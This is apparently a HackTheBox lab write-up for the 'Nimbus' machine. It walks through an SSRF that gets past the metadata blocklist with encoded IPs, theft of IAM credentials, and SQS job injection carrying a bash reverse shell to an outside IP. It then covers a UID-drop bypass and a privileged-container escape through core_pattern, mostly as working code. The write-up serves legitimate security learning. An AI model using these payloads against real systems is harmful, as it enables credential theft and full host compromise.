# HackTheBox: Nimbus Write-up

## Enumeration

I started by scanning the target with Nmap:

```bash
nmap -sSVC -A 10.129.14.252
```

The scan revealed two open ports:

```text
22/tcp open  ssh   OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
80/tcp open  http  nginx 1.24.0
```

The HTTP service redirected to:

```text
http://nimbus.htb/
```

## SSRF to AWS Metadata Service

The application exposed a preview feature that could be abused to make server-side requests.

Using an alternative IP representation, I was able to bypass the IMDS blocklist and query the AWS metadata service:

```text
http://2852039166/latest/meta-data/iam/security-credentials/?file.yaml
```

The response exposed the IAM role name:

```text
nimbus-web-role
```

I then queried the role directly:

```text
http://2852039166/latest/meta-data/iam/security-credentials/nimbus-web-role?file.yaml
```

This returned temporary AWS credentials for the role.

I exported them into the current shell:

```bash
export AWS_ACCESS_KEY_ID="<ACCESS_KEY_ID>"
export AWS_SECRET_ACCESS_KEY="<SECRET_ACCESS_KEY>"
export AWS_SESSION_TOKEN="<SESSION_TOKEN>"
export AWS_DEFAULT_REGION="us-east-1"
```

## SQS Enumeration

The application used a LocalStack-style AWS endpoint at:

```text
http://aws.nimbus.htb
```

Using the recovered credentials, I enumerated the available SQS queues:

```bash
aws --endpoint-url http://aws.nimbus.htb sqs list-queues
```

The following queue was returned:

```text
http://floci:4566/847219365028/nimbus-jobs
```

## Worker Code Execution

The queue accepted job definitions that were processed by a worker.

I created a malicious job:

```json
{
  "name": "rce-job",
  "runtime": "python3.11",
  "schedule": "*/1 * * * *",
  "script": "import os; os.system('nohup bash -c \"bash -i >& /dev/tcp/10.10.15.225/4444 0>&1\" &')"
}
```

I sent it to the queue with the AWS CLI:

```bash
aws --endpoint-url http://aws.nimbus.htb sqs send-message \
--queue-url http://aws.nimbus.htb/847219365028/nimbus-jobs \
--message-body file://job.json
```

The worker processed the job and executed the supplied Python script, resulting in code execution as the `worker` user.

## Full Exploit Chain

The final privilege-escalation chain was based on the same initial SSRF and SQS primitives, but automated the remaining steps.

The chain was:

```text
SSRF
  ↓
AWS IMDS
  ↓
Temporary IAM credentials
  ↓
SQS job injection
  ↓
Unsafe YAML processing
  ↓
Python code execution as worker
  ↓
LocalStack CodeBuild project
  ↓
Privileged container
  ↓
Container escape through core_pattern
  ↓
Host root
```

## SSRF Bypass

The exploit used an octal representation of the metadata IP address:

```python
IMDS_URL = (
    "http://0251.0376.0251.0376"
    "/latest/meta-data/iam/security-credentials/nimbus-web-role"
    "?a=test.yaml"
)
```

This corresponds to:

```text
169.254.169.254
```

The `.yaml` suffix was included to satisfy the application's URL validation logic.

The request was sent through the vulnerable preview endpoint:

```python
def ssrf_fetch(vhost: str, url: str) -> str:
    data = urllib.parse.urlencode({"url": url}).encode()

    req = urllib.request.Request(
        f"http://{vhost}/jobs/preview",
        data=data
    )

    resp = urllib.request.urlopen(
        req,
        timeout=20
    ).read().decode(errors="replace")

    m = re.search(
        r"Raw response</h3><pre>(.*?)</pre>",
        resp,
        re.DOTALL
    )

    if m:
        return html.unescape(m.group(1)).strip()

    return ""
```

## SQS to Worker RCE

The worker accepted YAML job definitions from the SQS queue.

The exploit wrapped arbitrary Python code in Base64 and embedded it into a malicious YAML job:

```python
def send_sqs_job(creds: dict, python_code: str):
    import subprocess
    import yaml

    b64 = base64.b64encode(
        python_code.encode()
    ).decode()

    body = yaml.dump({
        "name": "privesc",
        "script": (
            "import base64;"
            f"exec(base64.b64decode('{b64}').decode())"
        )
    })
```

The AWS credentials obtained from IMDS were supplied to the AWS CLI:

```python
env["AWS_ACCESS_KEY_ID"] = creds["AccessKeyId"]
env["AWS_SECRET_ACCESS_KEY"] = creds["SecretAccessKey"]
env["AWS_SESSION_TOKEN"] = creds.get("Token", "")
env["AWS_DEFAULT_REGION"] = "us-east-1"
```

The job was then submitted to the `nimbus-jobs` queue.

The underlying issue was unsafe YAML handling on the worker side, which allowed the job contents to reach Python execution.

## LocalStack CodeBuild

The worker-side payload interacted with the internal LocalStack service:

```text
http://floci:4566
```

It created a CodeBuild project using a privileged container:

```python
cb.create_project(
    name=PROJECT,
    source={"type": "NO_SOURCE"},
    artifacts={"type": "NO_ARTIFACTS"},
    environment={
        "type": "LINUX_CONTAINER",
        "computeType": "BUILD_GENERAL1_SMALL",
        "image": "floci/floci:latest",
        "privilegedMode": True
    },
    serviceRole="arn:aws:iam::000000000000:role/codebuild-role"
)
```

## UID-Drop Bypass

The CodeBuild environment attempted to drop privileges based on the output of the `id` command.

The exploit overrode `id` using an exported Bash function:

```python
environmentVariablesOverride=[
    {
        "name": "BASH_FUNC_id%%",
        "value": "() { echo uid=1000; }",
        "type": "PLAINTEXT"
    }
]
```

This caused the container entrypoint to believe it was already running as a non-root user while the process actually remained UID `0`.

## Privileged Container Escape

The CodeBuild container ran with elevated Linux capabilities.

The exploit then identified the container's writable overlay directory:

```bash
UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
```

A helper script was created inside the container:

```bash
printf '#!/bin/sh\ncat /root/root.txt > %s/rootflag.txt\nchmod 777 %s/rootflag.txt\n' \
"$UDIR" "$UDIR" > /exploit_root.sh
```

Because the overlay directory also existed on the host, the script became visible through the corresponding host path.

Next, the kernel core-dump handler was overwritten:

```bash
echo "|${UDIR}/exploit_root.sh" > /proc/sys/kernel/core_pattern
```

A crash was then triggered:

```bash
ulimit -c unlimited
bash -c 'kill -11 $$'
```

This caused the host kernel to execute the helper script as root via the `core_pattern` usermode-helper mechanism.

The result was host-level root code execution.

## Automated PoC Structure

The final PoC automated the complete attack chain:

```text
1. Start callback listener
2. Trigger SSRF against IMDS
3. Recover temporary AWS credentials
4. Build the worker payload
5. Send malicious SQS job
6. Create privileged CodeBuild project
7. Bypass UID drop
8. Escape the container with core_pattern
9. Receive the result over HTTP
```

The exploit waited for callbacks from the target:

```python
got_it = _flag_event.wait(timeout=CALLBACK_TIMEOUT)
```

## Attack Path

```text
Nmap
  ↓
nimbus.htb
  ↓
SSRF in /jobs/preview
  ↓
IMDS blocklist bypass with encoded IP
  ↓
nimbus-web-role credentials
  ↓
AWS SQS enumeration
  ↓
nimbus-jobs queue
  ↓
Malicious YAML job
  ↓
Worker Python execution
  ↓
Internal LocalStack / CodeBuild
  ↓
Privileged floci container
  ↓
BASH_FUNC_id%% UID-drop bypass
  ↓
overlay2 host path discovery
  ↓
core_pattern usermode-helper escape
  ↓
Host root
```

## Notes

The AWS credentials, user flag, and root flag values have been intentionally removed from this public write-up.
